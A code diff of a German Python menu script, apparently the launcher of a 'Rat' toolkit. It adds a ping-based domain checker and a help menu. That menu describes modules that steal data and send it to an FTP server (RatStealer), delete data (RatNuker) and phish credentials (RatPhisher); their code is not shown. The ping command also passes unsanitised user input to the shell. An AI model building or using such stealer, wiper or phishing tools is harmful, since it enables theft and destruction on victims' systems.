@@ -12,7 +12,7 @@ import importlib
 import threading
 import random
 
-Version = "0.1.4"
+Version = "0.1.5"
 
 Placeholder = r""" 
 ______      _   _____                          _      
@@ -109,7 +109,7 @@ if  DARKMODE is True:
     bad = '\033[91m[!]\033[0m'
     info = '\033[93m[i]\033[0m'
     debug_symbol = '\033[92m[</>]\033[0m'
-    good = '\033[92m[🗸]\033[0m'
+    good = f'{green}[🗸]{white}'
     not_loadet = '\033[91m[✗]\033[0m'
     loadet = '\033[92m[🗸]\033[0m'
 else: 
@@ -763,6 +763,30 @@ def error_menu(error_message):
     with open("error_log.txt", "a") as log_file:
         log_file.write(error_report)
 
+def loading_screen(stop_event):
+    while not stop_event.is_set():
+        for char in "|/-\\":
+            print(f"{main_color_theme}Überprüfe Verfügbarkeit... {char}", end="\r")
+            time.sleep(0.2)
+
+def check_domain_availability(domain):
+    print(f"{main_color_theme}Überprüfe die Verfügbarkeit der Domain: {Secondary_color_theme}{domain}")
+    stop_event = threading.Event()
+    loading_thread = threading.Thread(target=loading_screen, args=(stop_event,))
+    loading_thread.start()
+
+    response = os.system(f"ping {domain} > nul")
+
+    stop_event.set()
+    loading_thread.join()
+
+    if response == 0:
+        rat_print(f"{red}[Nicht Kaufbar]{main_color_theme} Die Domain {Secondary_color_theme}{domain}{main_color_theme} ist erreichbar {Secondary_color_theme}(nicht kaufbar){main_color_theme}.")
+        sleep(5)
+    else:
+        rat_print(f"{green}[Kaufbar]{main_color_theme} Die Domain {Secondary_color_theme}{domain}{main_color_theme} ist nicht erreichbar {Secondary_color_theme}(warscheinlich kaufbar){main_color_theme}.")
+        sleep(5)
+
 def change_color(option):
     global change_color, main_color_theme
     color_code = option.split()[-1]
@@ -852,6 +876,84 @@ def test():
     rat_repeat(f"rat_print('testing.'), sleep(5), rat_print('testing..'), rat_print('testing...')",  5)
     debug("testing")
 
+def info():
+    menu = f"""
+    {main_color_theme}----------------------------- Info Menü -----------------------------{end}
+    {Secondary_color_theme}1. Disco Start/Stop:{end}
+       {main_color_theme}Beschreibung:{end} Startet oder stoppt den Disco-Modus.
+       {main_color_theme}Aufruf:{end}
+       - {Secondary_color_theme}Disco starten:{end} 'disco start'
+       - {Secondary_color_theme}Disco stoppen:{end} 'disco stop'
+
+    {Secondary_color_theme}2. Farbe ändern:{end}
+       {main_color_theme}Beschreibung:{end} Ändert das Farbschema des Skripts.
+       {main_color_theme}Aufruf:{end} Geben Sie 'color <farbe>' ein (z. B. 'color blue').
+
+    {Secondary_color_theme}3. Skript starten:{end}
+       {main_color_theme}Beschreibung:{end} Startet ein bestimmtes Skript.
+       {main_color_theme}Aufruf:{end} Geben Sie 'start <script_name>' ein (z. B. 'start myscript').
+
+    {Secondary_color_theme}4. Reload:{end}
+       {main_color_theme}Beschreibung:{end} Lädt das Skript neu.
+       {main_color_theme}Aufruf:{end} 'rl' oder 'reload'
+
+    {Secondary_color_theme}5. Clear:{end}
+       {main_color_theme}Beschreibung:{end} Löscht den Bildschirminhalt.
+       {main_color_theme}Aufruf:{end} 'clear'
+
+    {Secondary_color_theme}6. Test:{end}
+       {main_color_theme}Beschreibung:{end} Führt einen Testlauf aus.
+       {main_color_theme}Aufruf:{end} 'test'
+
+    {Secondary_color_theme}7. Domain-Verfügbarkeit prüfen:{end}
+       {main_color_theme}Beschreibung:{end} Prüft die Verfügbarkeit einer Domain.
+       {main_color_theme}Aufruf:{end} 'domain <domain_name>' (z. B. 'domain example.com')
+
+    {Secondary_color_theme}8. Domain anpingen:{end}
+       {main_color_theme}Beschreibung:{end} Pingt eine Domain an, um deren Erreichbarkeit zu testen.
+       {main_color_theme}Aufruf:{end} 'ping <domain_name>' (z. B. 'ping example.com')
+
+    {Secondary_color_theme}9. Debug-Modus umschalten:{end}
+       {main_color_theme}Beschreibung:{end} Schaltet den Debug-Modus ein oder aus.
+       {main_color_theme}Aufruf:{end} 'debug' (Variationen: 'debug on', 'debug off')
+
+    {Secondary_color_theme}10. Rat-Funktionen (Optionen 1-9):{end}
+        - **RatStealer** (Option 1): Diese Funktion stiehlt Informationen und sendet diese an einen FTP-Server.
+        - **RatNuker** (Option 2): Führt zerstörerische Aktionen aus, wie das Löschen von Daten.
+        - **RatCrawler** (Option 3): Sammelt Informationen oder durchsucht das Zielsystem nach Daten.
+        - **RatDehasher** (Option 4): Knackt Hashes, um Passwörter oder andere verschlüsselte Daten wiederherzustellen.
+        - **Verschlüsselungsmenü** (Option 5): Öffnet ein Menü, in dem verschiedene Verschlüsselungsmethoden verwendet werden können.
+        - **RatSetup** (Option 6): Führt eine Setup-Routine zum Einrichten des Zielsystems durch.
+        - **RatPhisher** (Option 7): Startet eine Phishing-Aktion, um vertrauliche Informationen von einem Ziel zu stehlen.
+        - **RatSave_menu** (Option 8): Speichert Videos von Youtube, etc.
+        - **RatCreate** (Option 9): Erzeugt ein neues Python-Skript mit vorgefertigten Funktionen.
+
+    {Secondary_color_theme}11. Programm beenden:{end}
+       {main_color_theme}Beschreibung:{end} Beendet das Programm.
+       {main_color_theme}Aufruf:{end} '10'
+
+    {Secondary_color_theme}12. Streamer-Modus:{end}
+       {main_color_theme}Beschreibung:{end} Schaltet den Streamer-Modus um, möglicherweise um sensible Daten zu verstecken.
+       {main_color_theme}Aufruf:{end} '100'
+
+    {Secondary_color_theme}13. ASCII anzeigen:{end}
+       {main_color_theme}Beschreibung:{end} Zeigt ASCII-Kunst an.
+       {main_color_theme}Aufruf:{end} '200'
+
+    {Secondary_color_theme}14. Willkommensnachricht anzeigen:{end}
+       {main_color_theme}Beschreibung:{end} Zeigt eine Willkommensnachricht an.
+       {main_color_theme}Aufruf:{end} '250'
+
+    {Secondary_color_theme}15. Lightmode/Darkmode umschalten:{end}
+       {main_color_theme}Beschreibung:{end} Schaltet den Lightmode an, dieser zeigt ein minimalistisches Overlay an
+       {main_color_theme}Aufruf:{end} '300'
+    {main_color_theme}----------------------------------------------------------------------
+    {end}
+    """
+
+    print(menu)
+    os.system("pause")
+
 def main_menu():
     script_status = initialize_scripts()
     while True:
@@ -868,6 +970,10 @@ def main_menu():
                 start_disco()
                 continue
 
+            if option in ["help", "?"]:
+                info()
+                continue
+            
             if option.startswith("color "):
                 change_color(option)
                 continue
@@ -895,6 +1001,22 @@ def main_menu():
 
             if option == "test":
                 test()
+                continue
+
+            if option.startswith("domain "):
+                domain = option[7:].strip()
+                if domain:
+                    check_domain_availability(domain)
+                else:
+                    print("Keine gültige Domain eingegeben.")
+                continue
+
+            if option.startswith("ping "):
+                domain = option[5:].strip()
+                if domain:
+                    check_domain_availability(domain)
+                else:
+                    print("Keine gültige Domain eingegeben.")
                 continue
 
             if option in ["debug", "debug on", "debug true", "debug off", "debug false"]:
@@ -959,3 +1081,4 @@ def main_menu():
 if __name__ == "__main__":
     disco_running = False
     main_menu()
+#By Mausi Schmausi
